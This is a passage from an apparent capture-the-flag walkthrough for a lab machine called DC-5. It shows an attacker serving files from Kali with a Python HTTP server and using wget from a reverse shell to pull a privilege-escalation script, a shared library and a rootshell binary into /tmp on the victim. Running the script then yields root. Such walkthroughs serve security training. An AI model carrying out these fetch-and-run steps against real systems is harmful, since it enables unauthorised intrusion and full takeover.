4.2 Upload files to the Victime Machine


a) Since we have stored all the files in a folder “/home/kali/DC-5/”, now let’s upload them into the target’s system using python server. Run on your Kali Machine this code.

$python -m SimpleHTTPServer


Output:
Serving HTTP on 0.0.0.0 port 8000 ...

b) On your “Victim Machine reserve shell” run this code to upload the file.

$cd /tmp
$wget http://192.168.12.56:8000/script.sh
$wget http://192.168.12.56:8000/libhax.so
$wget http://192.168.12.56:8000/rootshell


Output:
192.168.12.67 - - [29/Jun/2020 14:30:01] "GET /script.sh HTTP/1.1" 200 -
192.168.12.67 - - [29/Jun/2020 14:31:57] "GET /libhax.so HTTP/1.1" 200 -
192.168.12.67 - - [29/Jun/2020 14:32:47] "GET /rootshell HTTP/1.1" 200 -

c) “Victim Machine reserve shell” make the file “script.sh” executable and run it.


$chmod 777 script.sh
$./script.sh


e) Check whether you're “root” or not.

$whoami


Output:
root


You are “root”!
